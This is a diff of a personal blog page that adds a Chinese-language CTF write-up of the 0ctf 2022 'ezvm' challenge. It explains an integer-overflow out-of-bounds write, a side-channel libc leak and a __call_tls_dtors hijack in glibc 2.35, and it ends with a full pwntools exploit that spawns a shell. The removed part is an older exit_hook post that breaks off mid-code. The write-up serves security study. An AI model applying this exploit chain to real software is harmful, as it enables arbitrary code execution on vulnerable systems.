@@ -155,6 +155,146 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/09/22/0ctf-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/22/0ctf-2022/" class="post-title-link" itemprop="url">0ctf-2022</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-22 11:18:24" itemprop="dateCreated datePublished" datetime="2022-09-22T11:18:24+08:00">2022-09-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-24 21:03:51" itemprop="dateModified" datetime="2022-09-24T21:03:51+08:00">2022-09-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>照着<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/35596">Water Paddler队的wp</a>复现的，不得不说外国师傅写wp都挺详细的，都落在重点上。这题我自己大概复现了两天左右，感觉是道很不错的题目</p>
+<p>首先总结一下从中学到的知识点：</p>
+<ol>
+<li><p>这题中用来泄漏libc的方式有点侧信道攻击的feel，利用运算结果的不同分别设置了两种跳转，对应着程序不同的输出结果，这样就可以通过程序的输出来判断当前泄漏的bit是多少</p>
+</li>
+<li><p>这题的漏洞为一个整数溢出导致的size跟实际malloc的size不同，从而获得了任意libc写，所以平时做题时可以重点关注有没有malloc的size跟输入的size有出入的情况，可能洞就在这里。</p>
+</li>
+<li><p>get了一条在2.35下可用的任意函数执行的新链（<code>___call_tls_dtors</code>）</p>
+<p>利用条件总结一下就是：① 有libc(vmmap)地址，有libc(vmmap)任意地址写。② 能显式或者隐式调用<code>exit</code>。</p>
+<p>这条链的优点大概就是很容易构造，只需要修改很少的地方就可以做到任意函数执行且控制rdi。</p>
+<p>利用方式：①在<code>fs:[-0x58]</code>这个位置布置一个指针。②将<code>fs:[0x30]</code>这个点盖成0。③将要调用的函数地址<code>rol 0x11</code>之后写到①指针指向的地址。④在①指针指向的地址+8处布置参数地址。⑤调用<code>exit</code></p>
+</li>
+</ol>
+<p>详细的跟着题目一起讲</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>版本glibc-2.35，保护全开，没有沙箱</p>
+<p>main函数</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-1.jpg" class>
+
+<p>无限次数执行直到输入<code>bye bye\x00</code></p>
+<p>跟到<code>run_vm</code>函数</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-2.jpg" class>
+
+<p>首先要求输入<code>Code</code>的size，程序跟着malloc对应大小来用作<code>Code</code>空间</p>
+<p>接着要求输入<code>memory count</code>，程序会将<code>count * 8</code>作为malloc的大小申请空间保存<code>Data</code>，这里就存在一个整数溢出，导致count可以远大于malloc的大小，例如<code>0x2000000000000000 * 8 == 0</code>，其高位会被置零，另外只允许一次输入的count大于<code>0x1FFFFFFFFFFFFFFLL</code>。</p>
+<p>接下来是<code>initvm()</code>，里面将前面malloc的chunk的指针放到数据段上，然后<code>malloc(0x800);</code>用来作为栈空间（结合后面执行指令的函数知道的）</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-3.jpg" class>
+
+<p>然后就是执行指令的函数<code>execve_vm</code>，这部分就是正常的vm指令逆向，这题的指令集逆向并不是很困难，各部分指令的快速解释如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0 -&gt; push r0-3 on stack</span><br><span class="line">1 -&gt; pop from stack (to r0-r3)</span><br><span class="line">2 -&gt; add</span><br><span class="line">3 -&gt; sub</span><br><span class="line">4 -&gt; multiply</span><br><span class="line">5 -&gt; divide</span><br><span class="line">6 -&gt; modulo</span><br><span class="line">7 -&gt; shl</span><br><span class="line">8 -&gt; shr</span><br><span class="line">9 -&gt; and</span><br><span class="line">10 -&gt; well no 10 , because 10 is carriage return , and ends code input :)</span><br><span class="line">11 -&gt; or</span><br><span class="line">12 -&gt; xor</span><br><span class="line">13 -&gt; test</span><br><span class="line">14 -&gt; jmp offset</span><br><span class="line">15 -&gt; jmpne offset  ,jump if actual stack value != 0,  and pop value</span><br><span class="line">16 -&gt; jmpe offset   ,jump if actual stack value == 0,  and pop value</span><br><span class="line">17 -&gt; compare two stacks entries, pop them, push 1 if equals</span><br><span class="line">18 -&gt; compare two stacks entries, pop them, push 1 if lower</span><br><span class="line">19 -&gt; compare two stacks entries, pop them, push 1 if higher</span><br><span class="line">20 -&gt; set 64bit value of internal reg r0-3</span><br><span class="line">21 -&gt; write r0-r3 to offset in data memory (oob is here)</span><br><span class="line">22 -&gt; read data memory value at offset, in internal register r0-3 (no oob in this one)</span><br><span class="line">23 -&gt; exit opcode</span><br></pre></td></tr></table></figure>
+
+<p>这部分的具体逆向就不写了，比较简单，这里只具体说一下各部分的思路：</p>
+<h4 id="1-泄漏libc"><a href="#1-泄漏libc" class="headerlink" title="1.泄漏libc"></a>1.泄漏libc</h4><p>逆向完全部指令集之后可以发现并没有能够给我们输出程序相关信息的指令，当对应的指令不存在时程序会打印一个<code>what???</code></p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-4.jpg" class>
+
+<p>而这题就需要利用这个点，首先关注到15、16对应的指令相当于根据栈顶是否空来决定是否进行跳转，如下：</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-5.jpg" class>
+
+<p>另外程序中还有能将栈顶两个元素按位或的指令</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-6.jpg" class>
+
+<p>所以我们就可以让1跟那个要被我们泄漏的地址的每一位进行按位或，这样栈顶元素就一定是0/1，这样15/16指令就会根据按位或的结果产生不同的跳转，让这个不同的跳转分别对应两种不同的程序输出（例如让某种情况跳转到一个不存在的指令集，那么这种情况对应的就是程序输出了<code>what???</code>，而另一种情况跳转到正常退出的指令，那么程序就不会输出<code>what???</code>，我们就可以根据程序的输出来确定按位或的结果，从而泄漏出每一个bit）</p>
+<p>在此前有一个问题就是怎么获得一个libc的地址在vm模拟的<code>Stack</code>空间里，思路如下：</p>
+<p>首先是run_vm中的malloc流程：</p>
+<ol>
+<li>malloc Code空间</li>
+<li>malloc Data空间</li>
+<li>进入初始化vm的函数时固定<code>malloc(0x800);</code>作为栈空间</li>
+</ol>
+<p>执行完Code之后的free流程：<code>free Data -&gt; free Code -&gt; free Stack</code></p>
+<p>如果第一轮malloc一个tcache size给Code，malloc一个unsorted bin size给Data，那么在最后free走的时候Data跟Stack的chunk会合并，第二轮拿回Data的时候就会留一个main_arena（或者说两个）</p>
+<h4 id="2-任意libc地址写"><a href="#2-任意libc地址写" class="headerlink" title="2.任意libc地址写"></a>2.任意libc地址写</h4><p>在前面已经说过了程序在申请Code空间时存在整数溢出，而这个点可以利用在21这个指令集里</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-7.jpg" class>
+
+<p>很简单，就是把一个模拟的寄存器的值写到以Data为基址的任意偏移处，让这个偏移几乎无限大的时候就是任意libc地址写了。</p>
+<h4 id="3-指令执行"><a href="#3-指令执行" class="headerlink" title="3.指令执行"></a>3.指令执行</h4><p>当程序调用<code>exit</code>时存在这样的调用链：<code>exit() -&gt; __run_exit_handlers() -&gt; __call_tls_dtors()</code></p>
+<p>其中<code>__call_tls_dtors</code>函数用来解析<code>dtors</code>表，首先dtors table是个单链表，其结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    dtor_func func;		<span class="comment">//8 bit</span></span><br><span class="line">    <span class="keyword">void</span> *obj;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>该单链表会被<code>__call_tls_dtors()</code>逐个解析，调用其中的<code>dtor_func func</code>并且以<code>void *obj;</code>作为参数，但是这个函数调用<code>dtor_func func</code>的方式有点奇怪，具体的结合着汇编来看。</p>
+<p>该函数的具体汇编如下：</p>
+<img src="/2022/09/22/0ctf-2022/call_tls_dtors-1.jpg" class>
+
+<p>稍微说一下汇编逻辑，其首先其会检查<code>tls-storage</code>区域(<code>fs:[-0x58]</code>)是否存在dtors表（存放dtors表的指针，并不是dtors表本身在这个位置）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dc7d6a</span> &lt;__GI___call_tls_dtors+<span class="number">10</span>&gt;:	mov    rbx,QWORD PTR [rip+<span class="number">0x1d301f</span>]        # <span class="number">0x7ffff7f9ad90</span></span><br><span class="line"><span class="number">0x7ffff7dc7d71</span> &lt;__GI___call_tls_dtors+<span class="number">17</span>&gt;:	mov    rbp,QWORD PTR fs:[rbx]</span><br><span class="line"><span class="number">0x7ffff7dc7d75</span> &lt;__GI___call_tls_dtors+<span class="number">21</span>&gt;:	test   rbp,rbp</span><br></pre></td></tr></table></figure>
+
+<p>如果不存在就准备返回</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dc7d78</span> &lt;__GI___call_tls_dtors+<span class="number">24</span>&gt;:	je     <span class="number">0x7ffff7dc7dbd</span> &lt;__GI___call_tls_dtors+<span class="number">93</span>&gt;</span><br><span class="line">......</span><br><span class="line"><span class="number">0x7ffff7dc7dbd</span> &lt;__GI___call_tls_dtors+<span class="number">93</span>&gt;:	add    rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7ffff7dc7dc1</span> &lt;__GI___call_tls_dtors+<span class="number">97</span>&gt;:	pop    rbx</span><br><span class="line"><span class="number">0x7ffff7dc7dc2</span> &lt;__GI___call_tls_dtors+<span class="number">98</span>&gt;:	pop    rbp</span><br><span class="line"><span class="number">0x7ffff7dc7dc3</span> &lt;__GI___call_tls_dtors+<span class="number">99</span>&gt;:	ret    </span><br></pre></td></tr></table></figure>
+
+<p>如果存在则一个个遍历，并且调用每个dtors table中的<code>dtor_func func;</code>，以<code>void *obj;</code>作为第一个参数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dc7d7a</span> &lt;__GI___call_tls_dtors+<span class="number">26</span>&gt;:	nop    WORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7ffff7dc7d80</span> &lt;__GI___call_tls_dtors+<span class="number">32</span>&gt;:	mov    rdx,QWORD PTR [rbp+<span class="number">0x18</span>]		<span class="meta"># struct dtor_list *next;</span></span><br><span class="line"><span class="number">0x7ffff7dc7d84</span> &lt;__GI___call_tls_dtors+<span class="number">36</span>&gt;:	mov    rax,QWORD PTR [rbp+<span class="number">0x0</span>]		# dtor_func func;</span><br><span class="line"><span class="number">0x7ffff7dc7d88</span> &lt;__GI___call_tls_dtors+<span class="number">40</span>&gt;:	ror    rax,<span class="number">0x11</span>						# 这里会把func ror <span class="number">0x11</span>位</span><br><span class="line"><span class="number">0x7ffff7dc7d8c</span> &lt;__GI___call_tls_dtors+<span class="number">44</span>&gt;:	<span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x30</span>		# 然后跟fs:[<span class="number">0x30</span>]异或一次</span><br><span class="line"><span class="number">0x7ffff7dc7d95</span> &lt;__GI___call_tls_dtors+<span class="number">53</span>&gt;:	mov    QWORD PTR fs:[rbx],rdx		# 将next指针写到fs:[<span class="number">-0x58</span>]</span><br><span class="line"><span class="number">0x7ffff7dc7d99</span> &lt;__GI___call_tls_dtors+<span class="number">57</span>&gt;:	mov    rdi,QWORD PTR [rbp+<span class="number">0x8</span>]		<span class="meta"># void *obj;</span></span><br><span class="line"><span class="number">0x7ffff7dc7d9d</span> &lt;__GI___call_tls_dtors+<span class="number">61</span>&gt;:	call   rax							<span class="meta"># func(*obj);</span></span><br><span class="line"><span class="number">0x7ffff7dc7d9f</span> &lt;__GI___call_tls_dtors+<span class="number">63</span>&gt;:	mov    rax,QWORD PTR [rbp+<span class="number">0x10</span>]</span><br><span class="line"><span class="number">0x7ffff7dc7da3</span> &lt;__GI___call_tls_dtors+<span class="number">67</span>&gt;:	lock sub QWORD PTR [rax+<span class="number">0x468</span>],<span class="number">0x1</span></span><br><span class="line"><span class="number">0x7ffff7dc7dac</span> &lt;__GI___call_tls_dtors+<span class="number">76</span>&gt;:	mov    rdi,rbp</span><br><span class="line"><span class="number">0x7ffff7dc7daf</span> &lt;__GI___call_tls_dtors+<span class="number">79</span>&gt;:	call   <span class="number">0x7ffff7daa370</span> &lt;<span class="built_in">free</span>@plt&gt;</span><br><span class="line"><span class="number">0x7ffff7dc7db4</span> &lt;__GI___call_tls_dtors+<span class="number">84</span>&gt;:	mov    rbp,QWORD PTR fs:[rbx]</span><br><span class="line"><span class="number">0x7ffff7dc7db8</span> &lt;__GI___call_tls_dtors+<span class="number">88</span>&gt;:	test   rbp,rbp						# 判断是否有下一个dtors表</span><br><span class="line"><span class="number">0x7ffff7dc7dbb</span> &lt;__GI___call_tls_dtors+<span class="number">91</span>&gt;:	jne    <span class="number">0x7ffff7dc7d80</span> &lt;__GI___call_tls_dtors+<span class="number">32</span>&gt;	#如果有就重复执行</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在正常情况下该函数取完<code>dtor_func func;</code>之后会先<code>ror 0x11</code>，然后再跟<code>fs:0x30</code>这个点异或一次（fs:0x30就是跟canary有关的那个随机数），接下来再正常取参数然后调用。</p>
+<p>所以我们想要做到任意函数调用的话首先需要把<code>fs:0x30</code>这个随机值给盖掉，然后把函数地址<code>rol 0x11</code>之后写到<code>dtor_func func;</code>里。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ezvm&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;code size&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>)) <span class="comment">#code</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;memory count:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>)) <span class="comment">#count =&gt; Data = 8*0x100</span></span><br><span class="line">code = <span class="string">&#x27;\x17&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your code:&quot;</span>,code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mov reg[0],Data[0]</span></span><br><span class="line"><span class="comment"># mov reg[1],p64(1&lt;&lt;i)</span></span><br><span class="line"><span class="comment"># push reg[0]</span></span><br><span class="line"><span class="comment"># push reg[1]</span></span><br><span class="line"><span class="comment"># and :reg[0] &amp;= reg[1]</span></span><br><span class="line"><span class="comment"># jmp if stack[sp] not zero</span></span><br><span class="line"></span><br><span class="line">leak = <span class="number">0</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;continue?\n&quot;</span>,<span class="string">&#x27;continue&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">41</span>,<span class="number">1</span>):</span><br><span class="line">	code = <span class="string">&#x27;\x16\x00&#x27;</span>+p64(<span class="number">0</span>) <span class="comment">#mov reg[0],Data[0]</span></span><br><span class="line">	code += <span class="string">&#x27;\x14\x01&#x27;</span>+p64(<span class="number">1</span>&lt;&lt;i) <span class="comment">#mov reg[1],p64(1&lt;&lt;i)</span></span><br><span class="line">	code += <span class="string">&#x27;\x00\x00&#x27;</span> <span class="comment"># push reg[0]</span></span><br><span class="line">	code += <span class="string">&#x27;\x00\x01&#x27;</span> <span class="comment"># push reg[1]</span></span><br><span class="line">	code += <span class="string">&#x27;\x09&#x27;</span> <span class="comment"># and :reg[0] &amp;= reg[1]</span></span><br><span class="line">	code += <span class="string">&#x27;\x0f&#x27;</span>+p64(<span class="number">1</span>) <span class="comment"># if 0:jmp 0x18,if 1:jmp 0x17</span></span><br><span class="line">	code += <span class="string">&#x27;\x18\x17&#x27;</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;code size:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(code))) <span class="comment">#code</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;memory count:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>)) <span class="comment">#count =&gt; Data = 8*0x100</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input your code:&quot;</span>,code)</span><br><span class="line">	a = p.recvuntil(<span class="string">&quot;finish!\n&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&#x27;what???&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> a:</span><br><span class="line">		leak |= <span class="number">1</span>&lt;&lt;i</span><br><span class="line">leak |= <span class="number">0x7f0000000000</span></span><br><span class="line">libc_base = leak - (<span class="number">0x7ffb052bbce0</span> - <span class="number">0x7ffb050a2000</span>)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">fsbase = libc_base + (<span class="number">0x7ffb0509f740</span> - <span class="number">0x7ffb050a2000</span>)</span><br><span class="line">vmmap = libc_base + (<span class="number">0x7f51e7701010</span> - <span class="number">0x7f51e7885000</span>)</span><br><span class="line"><span class="comment"># fs:[-0x58] = system</span></span><br><span class="line"><span class="comment"># fs:[-0x58] + 8 = binsh</span></span><br><span class="line"><span class="comment"># fs:0x30 = 0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rol</span>(<span class="params">num,shift</span>):</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(shift):</span><br><span class="line">		num=(num&lt;&lt;<span class="number">0x1</span>)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>+(num&amp;<span class="number">0x8000000000000000</span>)</span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line">code = <span class="string">&#x27;\x14\x03&#x27;</span>+p64(rol(system,<span class="number">0x11</span>))</span><br><span class="line">code += <span class="string">&#x27;\x14\x02&#x27;</span>+p64(binsh)</span><br><span class="line">code += <span class="string">&#x27;\x14\x01&#x27;</span>+p64(vmmap+<span class="number">0x181000</span>)</span><br><span class="line">code += <span class="string">&#x27;\x14\x00&#x27;</span>+p64(<span class="number">0</span>)</span><br><span class="line">offset = (fsbase-<span class="number">0x58</span>-vmmap)/<span class="number">8</span></span><br><span class="line">code += <span class="string">&#x27;\x15\x01&#x27;</span>+p64(offset) <span class="comment"># fs:[-0x58] point to vmmap+0x600</span></span><br><span class="line">code += <span class="string">&#x27;\x15\x03&#x27;</span>+p64(<span class="number">0x181000</span>/<span class="number">8</span>)</span><br><span class="line">code += <span class="string">&#x27;\x15\x02&#x27;</span>+p64(<span class="number">0x181008</span>/<span class="number">8</span>)</span><br><span class="line">offset = (fsbase+<span class="number">0x30</span>-vmmap)/<span class="number">8</span></span><br><span class="line">code += <span class="string">&#x27;\x15\x00&#x27;</span>+p64(offset)</span><br><span class="line">code += <span class="string">&#x27;\x17&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b __call_tls_dtors&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x23C9)&#x27;)</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;code size:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(code))) <span class="comment">#code</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;memory count:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x2000000000030000</span>)) <span class="comment">#count =&gt; Data = 8*0x100</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Please input your code:&quot;</span>,code)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;continue?\n&quot;</span>,<span class="string">&#x27;bye bye\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/08/29/VMpwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1253,100 +1393,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/22/exit-hook/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/06/22/exit-hook/" class="post-title-link" itemprop="url">exit_hook</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-06-22 14:14:51 / 修改时间：16:11:10" itemprop="dateCreated datePublished" datetime="2022-06-22T14:14:51+08:00">2022-06-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h3><p>详细的博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bhxdn/p/14222558.html">exit_hook在pwn题中的应用</a>、<a target="_blank" rel="noopener" href="https://www.freesion.com/article/9980545061/">exit_hook劫持</a></p>
-<p>这里直接写总结：</p>
-<ol>
-<li><p>在exit函数的调用链中会根据存在于<code>_rtld_global</code>结构体中的两个函数指针分别调用这两个函数：<code>__rtld_lock_lock_recursive</code>、<code>__rtld_lock_unlock_recursive</code>，而这两个函数指针是可写的，所以能被劫持</p>
-</li>
-<li><p>程序中即便没有主动调用exit函数，在程序正常返回到<code>__libc_start_main</code>时其也会调用exit函数，所以这个打法可能很多情况下都能用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7a2d840 &lt;__libc_start_main+240&gt;    mov    edi, eax</span><br><span class="line">  0x7ffff7a2d842 &lt;__libc_start_main+242&gt;    call   exit &lt;0x7ffff7a47040&gt;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>所需条件就是有libc地址，能够任意地址写最少三个字节即可。</p>
-<h4 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a>hfctf_2020_marksman</h4><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">3</span>]; <span class="comment">// [rsp+25h] [rbp-Bh] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_9BA(a1, a2, a3);</span><br><span class="line">  sub_A55();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Free shooting games! Three bullets available!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I placed the target near: %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span 